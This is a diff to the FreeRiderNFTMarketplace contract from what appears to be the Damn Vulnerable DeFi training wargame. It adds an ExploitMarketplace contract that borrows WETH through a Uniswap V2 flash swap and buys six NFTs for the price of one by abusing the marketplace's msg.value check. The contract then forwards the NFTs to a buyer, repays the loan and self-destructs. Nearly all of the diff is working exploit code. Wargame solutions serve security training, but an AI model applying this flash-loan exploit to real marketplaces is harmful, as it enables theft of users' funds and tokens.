@@ -4,6 +4,10 @@ pragma solidity ^0.8.0;
 import "@openzeppelin/contracts/utils/Address.sol";
 import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
 import "../DamnValuableNFT.sol";
+import "./IUniswapV2Pair.sol";
+
+import "./IWETH.sol";
+import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
 
 /**
  * @title FreeRiderNFTMarketplace
@@ -83,4 +87,70 @@ contract FreeRiderNFTMarketplace is ReentrancyGuard {
     }    
 
     receive() external payable {}
+}
+
+contract ExploitMarketplace is ERC721Holder {
+    IUniswapV2Pair pair;
+    FreeRiderNFTMarketplace marketplace;
+    // DamnValuableNFT public token;
+
+    address public buyer ; 
+    address payable public  owner ; 
+
+    constructor( IUniswapV2Pair _pair, FreeRiderNFTMarketplace _marketplace , address _buyer) { 
+        pair = _pair; 
+        marketplace = _marketplace;
+    
+        owner = payable(msg.sender);
+        buyer = _buyer; 
+    }
+
+    event Log(string message, uint value); 
+
+    function exploit(uint _nftPrice) external { 
+        bytes memory data = abi.encode(pair.token0(), _nftPrice);
+        pair.swap(_nftPrice, 0 , address(this), data);
+    }
+
+    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external  {
+        require(msg.sender == address(pair)); 
+        require(sender == address(this)); 
+        
+        (address payable tokenBorrow, uint amount) = abi.decode(data, (address, uint)); 
+        
+        uint256 fee = ((amount * 3) / 997) + 1; 
+        uint256 amountToRepay = amount + fee; 
+
+        IWETH weth = IWETH(tokenBorrow);
+        // withdraw the loan of amount
+        weth.withdraw(amount);
+
+        // now pay for one nft inside nft marketplace;
+        uint256 length = 6; 
+        uint256[] memory tokenIds = new uint[](length); 
+        for(uint i ; i < length; ++i ) {
+            tokenIds[i] = i ; 
+        }
+        marketplace.buyMany{value: amount}(tokenIds);
+        DamnValuableNFT nft = DamnValuableNFT(marketplace.token());
+
+        for(uint256 tokenId ; tokenId < length; ++tokenId) {
+            require(nft.ownerOf(tokenId) == address(this), "you are not the owner");
+            nft.safeTransferFrom(address(this), buyer, tokenId );
+        }
+        weth.deposit{value: amountToRepay}(); 
+        
+        weth.transfer(address(pair), amountToRepay);
+
+        emit Log("amount", amount);
+        emit Log("amount0", amount0);
+        emit Log("amount1", amount1);
+
+        
+        selfdestruct(owner);
+
+    }
+
+    receive() external payable {}
+
 }
